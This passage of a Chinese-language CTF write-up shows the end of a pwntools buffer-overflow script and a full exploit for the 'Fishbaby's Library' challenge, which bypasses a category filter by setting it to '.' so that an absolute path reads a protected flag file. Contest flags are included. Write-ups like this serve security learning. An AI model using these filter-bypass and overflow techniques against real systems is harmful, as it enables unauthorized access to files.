r.sendline(b'A'*0x20+b'pwn3d!!!')
r.interactive()
r.close()
```

> NHNC{dof==doblue_over_flow?!?!}

## Fishbaby's Library (300 pts)
```
出題者: Raymond

Fishbaby 開了一間圖書館，但是把 flag 鎖在圖書館的禁區，你能夠突破防護措施並讀取 flag 嗎？

nc chal.nhnc.ic3dt3a.org 2002
```
[file link](https://nhnc.ic3dt3a.org/files/34abcd77e3a9f2d63c9aebcc3cd3a0e8/fishbabys_library_upd.zip?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6ODF9.ZzybZQ.Akun0XrNCnG3njYwgcL2i18z9cE)
source code很長，就不放了

最剛開始時，exploit code有放在給的zip檔內

但他們發現時已經有5個人解了

~~很幸運我在那5個人之中~~

所以我在這邊就講講他的 exploit:
```python=
from pwn import *

p = remote('chal.nhnc.ic3dt3a.org', 2002)

p.sendline('S')
p.sendline('.')
p.sendline('R')
p.sendlineafter('Filename? ', '/home/chal/classified/flag')

flag = p.recvline()
log.info(flag)

p.close()
```
簡單來說，我們要透過`read_file`來得到flag

選單按`L`可以看到底下的內容:
```
Your choice> L
licenses/
rfcs/
classified/
hello_world/
visitor_notice.txt
run.sh
chal
gallery/
```
然後在source可以看到，`R`選項是用於read file

並且在`S`做Set category時對`classified`有過濾
```c=
case 'S':
  printf("Which category interests you? ");

  memset(category, 0x00, sizeof(category));
  scanf(" %[^\n./]", category);

  if (strstr(category, "..") || strstr(category, "/") || strstr(category, "classified")) {
    puts("Hacker!");
    exit(0xdead);
  }
```
回去看到exploit，輸入順序為:`S` -> `.` -> `R` -> `/home/chal/classified/flag`

前面`S`先用`.`，代表的是當前目錄，用來繞過`..` / `/` / `classified`

後面`R`再設定絕對路徑`/home/chal/classified/flag`

串接後，完整的系統查詢路徑就變成:`./home/chal/classified/flag`

提交exploit:

> NHNC{sneaked_into_forbidden_zone}